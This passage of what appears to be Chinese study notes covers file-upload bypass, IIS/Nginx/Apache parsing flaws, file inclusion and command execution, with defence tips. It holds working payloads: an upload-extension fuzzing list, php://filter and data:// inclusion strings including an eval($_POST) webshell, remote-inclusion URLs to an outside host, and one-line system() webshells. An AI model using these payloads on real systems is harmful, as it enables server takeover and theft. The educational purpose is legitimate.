class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">可执行脚本的文件后缀名，可被网站目录解析。以下是常见的后缀名：<br>  ○ asp <br>  ○ asa <br>  ○ cdx <br>  ○ cer <br>  ○ php <br>  ○ aspx <br>  ○ ashx <br>  ○ <span class="hljs-keyword">jsp </span><br>  ○ php3 <br>  ○ php.a <br>  ○ <span class="hljs-keyword">shtml </span><br>  ○ phtml <br>有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名：<br>  ○ aspasp <br>  ○ asaspp <br>  ○ phpphp  <br></code></pre></td></tr></table></figure><h3 id="文件上传绕过技术"><a class="header-anchor" href="#文件上传绕过技术">¶</a>文件上传绕过技术</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">绕过前端 js 检测上传<br>绕过 contnet-<span class="hljs-keyword">type</span> 检测上传<br>绕过黑名单上传<br>htaccess 重写解析绕过上传<br>大小写绕过上传<br>空格绕过上传攻击<br>利用 windows 系统特征绕过上传<br>NTFS 交换数据流::$DATA 绕过上传<br>利用 windows 环境的叠加特征绕过上传<br>双写后缀名绕过上传<br>目录可控<span class="hljs-variable">%00</span> 截断绕过上传（GET）<br>目录可控<span class="hljs-variable">%00</span> 截断绕过上传（POST）<br>文件头检测绕过上传<br>绕过图片二次渲染上传<br>文件上传条件竞争漏洞绕过<br>文件名可控绕过上传<br>数组绕过上传<br></code></pre></td></tr></table></figure><p>待细节补充………………</p><h3 id="文件上传漏洞通用检测方法"><a class="header-anchor" href="#文件上传漏洞通用检测方法">¶</a>文件上传漏洞通用检测方法</h3><p>​判断是否为黑白名单，如果是白名单，寻找可控参数。如果是黑名单禁止上传， 可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本.</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.php</span><br><span class="hljs-title">.php5</span><br><span class="hljs-title">.php4</span><br><span class="hljs-title">.php3</span><br><span class="hljs-title">.php2</span><br><span class="hljs-title">.html</span><br><span class="hljs-title">.htm</span><br><span class="hljs-title">.phtml</span><br><span class="hljs-title">.pht</span><br><span class="hljs-title">.pHp</span><br><span class="hljs-title">.phP</span><br><span class="hljs-title">.pHp5</span><br><span class="hljs-title">.pHp4</span><br><span class="hljs-title">.pHp3</span><br><span class="hljs-title">.pHp2</span><br><span class="hljs-title">.Html</span><br><span class="hljs-title">.Htm</span><br><span class="hljs-title">.pHtml</span><br><span class="hljs-title">.jsp</span><br><span class="hljs-title">.jspa</span><br><span class="hljs-title">.jspx</span><br><span class="hljs-title">.jsw</span><br><span class="hljs-title">.jsv</span><br><span class="hljs-title">.jspf</span><br><span class="hljs-title">.jtml</span><br><span class="hljs-title">.jSp</span><br><span class="hljs-title">.jSpx</span><br><span class="hljs-title">.jSpa</span><br><span class="hljs-title">.jSw</span><br><span class="hljs-title">.jSv</span><br><span class="hljs-title">.jSpf</span><br><span class="hljs-title">.jHtml</span><br><span class="hljs-title">.asp</span><br><span class="hljs-title">.aspx</span><br><span class="hljs-title">.asa</span><br><span class="hljs-title">.asax</span><br><span class="hljs-title">.ascx</span><br><span class="hljs-title">.ashx</span><br><span class="hljs-title">.asmx</span><br><span class="hljs-title">.cer</span><br><span class="hljs-title">.aSp</span><br><span class="hljs-title">.aSpx</span><br><span class="hljs-title">.aSa</span><br><span class="hljs-title">.aSax</span><br><span class="hljs-title">.aScx</span><br><span class="hljs-title">.aShx</span><br><span class="hljs-title">.aSmx</span><br><span class="hljs-title">.cEr</span><br><span class="hljs-title">.sWf</span><br><span class="hljs-title">.swf</span><br><span class="hljs-title">.htaccess</span><br></code></pre></td></tr></table></figure><ul><li>使用 burpsuite 抓包上传将后缀名设置成变量，把这些文件设置成一个字典批量提交；</li></ul><h3 id="文件上传的防御方法"><a class="header-anchor" href="#文件上传的防御方法">¶</a>文件上传的防御方法</h3><ul><li>服务器端使用白名单防御；</li><li>修复 web 中间件的漏洞；</li><li>禁止客户端存在可控参数；</li><li>存放文件目录禁止脚本执行；</li><li>限制后缀名；</li><li>一定要设置图片格式 jpg、gif 、 png 文件名随机的，不可预测；</li></ul><h1>文件解析漏洞</h1><img src="/posts/d62edc36/1677139760844-ffc9672c-3e1f-464b-9fe7-6d6b2d6b47fd.png" class title="img"><h2 id="原理-v5"><a class="header-anchor" href="#原理-v5">¶</a>原理</h2><p>​文件解析漏洞是由于中间件错误的将任意格式的文件解析成网页可执行文件，配合文件上传漏洞进行GetShell的漏洞！</p><h2 id="IIS解析漏洞"><a class="header-anchor" href="#IIS解析漏洞">¶</a>IIS解析漏洞</h2><h3 id="IIS6-X"><a class="header-anchor" href="#IIS6-X">¶</a>IIS6.X</h3><p><strong>方式一：目录解析</strong></p><p>在网站下建立文件夹的名字为 <code>.asp/.asa </code>的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p><p><strong>方式二：畸形文件解析</strong></p><p>在IIS 6 处理文件解析时，分号可以起到截断的效果。也就是说 shell.asp;.jpg会被服务器看成是shell.asp。另外IIS6.0默认的可执行文件除了asp还包含<code>asa\cer\cdx</code></p><h3 id="IIS7-X"><a class="header-anchor" href="#IIS7-X">¶</a>IIS7.X</h3><blockquote><p>在IIS7.0和IIS7.5版本下也存在解析漏洞，在默认Fast-CGI开启状况下，在一个文件路径/xx.jpg后面加上/xx.php会将 <code>**/xx.jpg/xx.php**</code> <em><strong>解析为 php 文件</strong></em>。</p></blockquote><p><strong>利用条件</strong></p><ol><li><p>php.ini里的cgi.fix_pathinfo=1 开启</p></li><li><p>IIS7在Fast-CGI运行模式下</p></li></ol><h3 id="修复方式"><a class="header-anchor" href="#修复方式">¶</a>修复方式</h3><p><strong>程序方面</strong></p><p>1、对新建目录文件名进行过滤，不允许新建包含.的文件夹。 <br>2、取消网站后台新建目录的功能,不允许新建目录。</p><p><strong>服务器方面</strong></p><p>1、限制上传目录的脚本执行权限，不允许执行脚本。 <br>2、过滤.asp/xm.jpg,通过ISApi组件过滤。 在httpd.ini加入了以下规则 ASP RewriteRule (.<em>).asp/(.</em>) /no.gif RewriteRule (.<em>).Asp/(.</em>) /no.gif RewriteRule (.<em>).aSp/(.</em>) /no.gif RewriteRule (.<em>).asP/(.</em>) /no.gif</p><h2 id="Nginx解析漏洞"><a class="header-anchor" href="#Nginx解析漏洞">¶</a>Nginx解析漏洞</h2><h4 id="nginx-parsing"><a class="header-anchor" href="#nginx-parsing">¶</a>nginx_parsing</h4><p>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。在一个文件/xx.jpg后面加上/.php会将 <code>/xx.jpg/xx.php </code>解析为 php 文件。</p><p><strong>》》》利用条件《《《</strong></p><ul><li>Nginx &lt;=0.8.37</li><li>cgi.fix_pathinfo=1</li></ul><p><strong>》》》利用姿势《《《</strong></p><p>Nginx的文件解析漏洞…和IIS7.0的解析漏洞同样的原理,因为<code>cgi.fix_pathinfo=1</code>造成的解析漏洞…</p><p>PS：同样使用<code>1.jpg/.php</code>方式进行绕过…</p><h4 id="CVE-2017-15715"><a class="header-anchor" href="#CVE-2017-15715">¶</a>CVE-2017-15715</h4><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><strong>》》》影响版本《《《</strong></p><ul><li>2.4.0~2.4.29</li></ul><h2 id="Apache解析漏洞"><a class="header-anchor" href="#Apache解析漏洞">¶</a>Apache解析漏洞</h2><h4 id="apache-parsing"><a class="header-anchor" href="#apache-parsing">¶</a>apache_parsing</h4><p>在Apache1.x/2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。如<code>1.php.xxxxx</code></p><p><strong>》》》漏洞原理《《《</strong></p><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如如下配置文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AddType text/html .html<br>AddLanguage zh-CN .cn<br></code></pre></td></tr></table></figure><p>其给<code>.html</code>后缀增加了<code>media-type</code>，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AddHandler application/x-httpd-php .php<br></code></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><h4 id="CVE-2017-15715-v2"><a class="header-anchor" href="#CVE-2017-15715-v2">¶</a>CVE-2017-15715</h4><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><strong>》》》影响版本《《《</strong></p><ul><li>2.4.0~2.4.29</li></ul><h1>文件包含漏洞</h1><blockquote><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞；</p></blockquote><blockquote><p>备注：几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在 PHP Web Application 中居多, 而在 JSP、ASP、<a href="http://ASP.NET">ASP.NET</a> 程序中却非常少，甚至没有，这是有些语言设计的弊端；在 PHP 中经常出现包含漏洞，但这并不意味这其他语言不存在</p></blockquote><h2 id="原理-v6"><a class="header-anchor" href="#原理-v6">¶</a>原理</h2><p>​在PHP程序（后端程序）中使用文件包含的对象<strong>可以被前端的用户控制</strong>且<strong>没有经过过滤或严格的定义</strong>，用户可以将其他的文件作为参数带入到PHP代码中解释执行，从而造成<strong>敏感信息泄露</strong>/<strong>程序文件读取</strong>/<strong>GetShell</strong>等危害的漏洞。</p><h2 id="高危函数-v2"><a class="header-anchor" href="#高危函数-v2">¶</a>高危函数</h2><img src="/posts/d62edc36/1684842263166-e1f4b12f-49de-46ca-8277-52dd79221758.png" class title="image.png"><ul><li>require() 和 include() 函数的区别：使用 require() 函数包含文件时，<strong>只要程序执行，立即调用文件</strong> ，而 include() <strong>只有程序执行到该函数时才调用</strong> 。</li><li>其他用于包含的函数: <em>highlight_file()、 show_source()、 readfile()、 file_get_contents()、 fopen()、file()</em></li><li>文件包含是执行被包含文件中的PHP代码，而文件打开则是读取文件中的内容不会执行！</li></ul><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h2><h3 id="本地文件包含-LFI"><a class="header-anchor" href="#本地文件包含-LFI">¶</a>本地文件包含(LFI)</h3><p>指通过<strong>相对路径/绝对路径</strong> 的方式能<strong>打开并包含</strong> 本地文件的漏洞，大部分情况遇到的文件包含漏洞都是 LFI  !</p><p>包含条件： 用户可以<strong>动态控制变量！</strong></p><p><strong>包含图片GetShell</strong></p><p>寻找网站上传点并把 php 恶意代码文件改成 <code>jpg</code> 上传到网站上在本地包含引入恶意代码，当文件被引入后代码就被执行。</p><p><strong>包含日志GetShell</strong></p><p>中间件例如 iis /apache/nginx 这些 web 中间件都会记录访问日志，如果访问日志中或错误日志中， 存在有 php 代码也可以引入到文件包含中，如果日志有 php 恶意代码也可导致 getshell；</p><p>在linux下日志文件权限默认是 root 而php 的权限是 <code>www-data</code> 一般情况下都是读取不了，如果是 windows 环境下是可以权限是允许的；</p><p><strong>PHP伪协议</strong></p><p>PHP 伪协议事实上就是<strong>支持的协议</strong> 与<strong>封装协议</strong></p><img src="/posts/d62edc36/1684847477587-c0cee458-c4ce-443b-b17e-751c48fa0022.png" class title="image.png"><ol><li>php.ini参数设置</li></ol><p>在 php.ini 里有两个重要的参数 <code>allow_url_fopen</code>、<code>allow_url_include</code>；</p><ul><li><p>allow_url_fopen:默认值是 ON。允许 url 里的封装协议访问文件；</p></li><li><p>allow_url_include:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p></li></ul><p>各协议的利用条件和方法：</p><img src="/posts/d62edc36/1684848862756-de52a5f2-f4a0-4c09-99b8-2fc8215498d9.png" class title="img"><ol><li><strong>file://协议</strong></li></ol><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi">使用：<span class="hljs-keyword">file</span>:<span class="hljs-comment">//文件的绝对路径和文件名</span><br>举例：<br><span class="hljs-number">123</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//c:\windows\system32\drivers\etc\hosts</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong>php://filter协议</strong></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">用途：常用于读取文件/源码<br><br>使用：?path=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=文件.php<br><br>注意：通过指定末尾的文件，可以读取经 base64 加密后的文件源码 ，之后再 base64 解码，虽然不能直接获取到 shell，但能读取敏感文件 。<br><br>php:<span class="hljs-regexp">//</span>filter 协议与 file:<span class="hljs-regexp">//</span> 协议的区别：file 协议只能使用 绝对路径 ，filter 协议相对路径和绝对路径 都可以使用<br>举例：<br><span class="hljs-number">123</span>.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-number">123</span>.php<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>php://input协议</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">用途：可以访问请求的的原始数据的只读流。将 post 请求中的数据作为 PHP 代码执行<br>条件：allow_url_include = on<br>举例：<br>?file=php:<span class="hljs-comment">//input</span><br>[POST]：<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  (执行POST DATA中的内容)<br></code></pre></td></tr></table></figure><ol start="4"><li><strong>data://</strong></li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">用途：数据（RFC2397）</span><br><span class="language-xml"></span><br><span class="language-xml">使用条件：</span><br><span class="language-xml">allow_url_fopen = on</span><br><span class="language-xml">allow_url_include = on</span><br><span class="language-xml"></span><br><span class="language-xml">使用举例：</span><br><span class="language-xml">?file=data:text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">?file=data:text/plain;base64, PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="language-xml">?file=data:text/plain,<span class="hljs-tag">&lt;<span class="hljs-name">php</span> <span class="hljs-attr">phpinfo</span>();?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">webshell构造：</span><br><span class="language-xml">URL: http://192.168.172.150/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">Webshell密码: 1</span><br></code></pre></td></tr></table></figure><ol start="5"><li><strong>zip://</strong></li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">用途：读取压缩包内的文件（绝对路径/相对路径）<br>使用条件：allow_url_fopen = <span class="hljs-keyword">on</span><br><br>使用举例：<br><span class="hljs-keyword">zip</span>:<span class="hljs-comment">//archive.zip                # dir/file.txt</span><br><span class="hljs-keyword">zip</span>:<span class="hljs-comment">//[压缩文件绝对/相对路径]     # [压缩文件内的子文件名]</span><br>?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">zip</span>:<span class="hljs-comment">//D:WWW/file.zip%23phpcode.txt</span><br>?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">zip</span>:<span class="hljs-comment">//D:WWW/file.jpg%23phpcode.txt</span><br>?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">zip</span>:<span class="hljs-comment">//D:WWW/file.jpg%23phpcode</span><br></code></pre></td></tr></table></figure><ol start="6"><li><strong>phar://</strong></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">用途：读取压缩包内的文件（绝对路径/相对路径）<br>使用条件：allow_url_fopen = on<br>举例：<br>?file=phar:<span class="hljs-regexp">//</span>D:<span class="hljs-regexp">/phpStudy/</span>WWW<span class="hljs-regexp">/fileinclude/</span>test.zip/phpinfo.txt<br>?file=phar:<span class="hljs-regexp">//</span>test.zip/phpinfo.txt<br>其他类似协议：<br>bzip2:<span class="hljs-regexp">//</span><br>zlib:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><h3 id="远程文件包含-RFI"><a class="header-anchor" href="#远程文件包含-RFI">¶</a>远程文件包含(RFI)</h3><p>当远程文件开启时，可以包含远程文件到本地执行也称为<strong>RFI</strong>！</p><p>当 <code>allow_url_fopen=On</code> <code>allow_url_include=ON</code> 两个条件同时为 On 允许远程包含文件。</p><h3 id="文件包含绕过"><a class="header-anchor" href="#文件包含绕过">¶</a>文件包含绕过</h3><p><strong>00截断</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">条件：1. magic_quotes_gpc = Off 2. php 版本 &lt; 5.3.4<br><br>获取 phpinfo.php 文件<br><br>payload：?<span class="hljs-attribute">action</span>=phpinfo.php%00<br></code></pre></td></tr></table></figure><p><strong>路径长度截断</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断。<br>Windows下目录的最大路径<span class="hljs-number">256</span>B<br>Linux下目录的最大路径长度为<span class="hljs-number">4096</span>B<br>条件：windows 系统需要长于 <span class="hljs-number">197</span> 字符 (即 &gt;=<span class="hljs-number">198</span>)，超出的部分会被丢弃<br><br>Payload:.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/.../</span> <br></code></pre></td></tr></table></figure><p><strong>点号截断</strong></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">点号截断适用于Windows系统，当点号的长度大于<span class="hljs-number">256</span>B时，就可以造成扩展名截断<br>条件：windows 系统，点号需要长于 <span class="hljs-number">197</span><br>payload:<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br></code></pre></td></tr></table></figure><p><strong>问号绕过</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">·payload：?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php?<br></code></pre></td></tr></table></figure><p><strong>＃绕过</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>：?action=http://<span class="hljs-number">192.168.152.143</span>/phpinfo.php%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><strong>空格绕过</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload：<br>?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php%<span class="hljs-number">20</span><br>?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php+<br>?action=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">152.143</span>/phpinfo.php abc<br></code></pre></td></tr></table></figure><h3 id="防护-v2"><a class="header-anchor" href="#防护-v2">¶</a><strong>防护</strong></h3><ol><li>严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；</li><li>路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：“…/”；</li><li>包含文件验证：验证被包含的文件是否是白名单中的一员；</li><li>尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(‘head.php’)；</li><li>设置 allow_url_include 为 Off ；</li></ol><h3 id="问题-v6"><a class="header-anchor" href="#问题-v6">¶</a>问题</h3><p><strong>1.什么是文件包含漏洞？</strong></p><p><strong>2.造成文件包含漏洞的高危函数，函数之间的区别！</strong></p><p><strong>3.文件包含的伪协议都有哪些？至少6个…</strong></p><p><strong>4.简述下文件包含漏洞的利用姿势与防护？</strong></p><h1>命令执行/代码执行漏洞</h1><h2 id="命令执行漏洞"><a class="header-anchor" href="#命令执行漏洞">¶</a>命令执行漏洞</h2><h3 id="概念-v2"><a class="header-anchor" href="#概念-v2">¶</a>概念</h3><p>由于PHP程序未对前端用户提交的数据进行严格过滤或限制，从而导致传入的字段被带入到命令执行函数中作为参数执行，造成GetShell或接管服务器权限等高危害的Web漏洞！</p><h3 id="漏洞危害"><a class="header-anchor" href="#漏洞危害">¶</a>漏洞危害</h3><ul><li>继承WEB服务器程序权限，执行系统命令（反弹Shell）</li><li>继承WEB服务器程序权限，读写文件（敏感文件）</li><li>GetShell控制网站，创建系统后门控制服务器！</li></ul><h3 id="高危函数-v3"><a class="header-anchor" href="#高危函数-v3">¶</a>高危函数</h3><p><strong>1.exec函数</strong></p><p>执行一个外部命令。</p><p>`<?php echo exec($_POST["cmd"]);?></p><?php print exec($_POST["cmd"]);?> //回显输出结果的最后一行`<p><strong>2.passthru函数</strong></p><p>执行外部程序，并且显示原始输出。</p><p><code>&lt;?php passthru($_POST[&quot;cmd&quot;]);?&gt;</code></p><p><strong>3.proc_open函数</strong></p><p>执行一个命令，并且打开用来输入/输出的文件指针。</p><p><strong>4.shell_exec函数</strong></p><p>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。</p><p>`<?php echo shell_exec($_POST["cmd"]); ?></p><?php print shell_exec($_POST["cmd"]); ?>  //无回显-必须输出`<p><strong>5.system函数</strong></p><p>执行外部程序，并且显示输出。</p><p><code>&lt;?php system($_POST[&quot;cmd&quot;]);?&gt;  //有回显</code></p><p><strong>6.popen函数</strong></p><p>通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行</p><p>只要命令的参数可控就能够执行系统命令。</p><p>system($cmd);或者system(‘ping -c 3’ . $target)</p><p>当$cmd可控的话就能够执行任意命令，</p><p>而当$target可控的话，可以用管道符等特殊字符截断从而执行任意命令。</p><p>$target = ‘a | whoami’;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>].<span class="hljs-string">&quot;&gt;&gt; 1.txt&quot;</span>; <span class="hljs-comment">//    结果将输出在当前目录下的1.txt文件内</span><br><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);              <span class="hljs-comment">//返回的是文件指针而非命令执行结果</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>7. 反引号 `</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `whoami`<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">print</span> `<span class="hljs-variable">$cmd</span>`; <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//[``]反引号里面的代码也会被当作OS命令来执行</span><br></code></pre></td></tr></table></figure><h3 id="命令连接符"><a class="header-anchor" href="#命令连接符">¶</a><strong>命令连接符</strong></h3><pre><code class="hljs">|</code></pre><p>管道操作符</p><p>可以把前一个命令的标准输出传输到后一个命令的标准输入</p><p>比如 a | b表示命令a的输出作为命令b的输入</p><p>在远程命令执行中，不管a的执行结果是否正确，b都可以执行</p><pre><code class="hljs">||</code></pre><p>逻辑或</p><p>注意该命令有短路的情况</p><p>比如 a || b，如果命令a执行成功，则命令b不会被执行；只有命令a执行失败的情况下，才会执行命令b</p><pre><code class="hljs">&amp;&amp;</code></pre><p>逻辑与</p><p>注意该命令有短路的情况</p><p>比如 a &amp;&amp; b，如果命令a执行失败，则命令b不会被执行；只有命令a执行成功的情况下，才会执行命令b</p><pre><code class="hljs">&amp;</code></pre><p>windows特有</p><p>允许在一行内从左向右顺序执行多条命令，前一条命令失败也不影响后一条命令的执行</p><p>比如 a &amp; b，不管a是否执行成功，b命令都会执行</p><pre><code class="hljs">;</code></pre><p>（可能看不清，这是个分号）</p><p><strong>linux系统特有</strong></p><p>允许在一行内从左向右顺序执行多条命令，前一条命令失败也不影响后一条命令的执行</p><p>比如 a ; b，不管a是否执行成功，b命令都会执行</p><h3 id="漏洞利用-v2"><a class="header-anchor" href="#漏洞利用-v2">¶</a>漏洞利用</h3><p><strong>挖掘思路</strong></p><p>黑盒测试：网络连接测试/文件编辑处/存在系统命令可疑处(后台)+未授权访问！</p><p>白盒测试：定位高危的命令执行函数，查看是否有前端可控的字段传入！</p><h4 id="1-有回显"><a class="header-anchor" 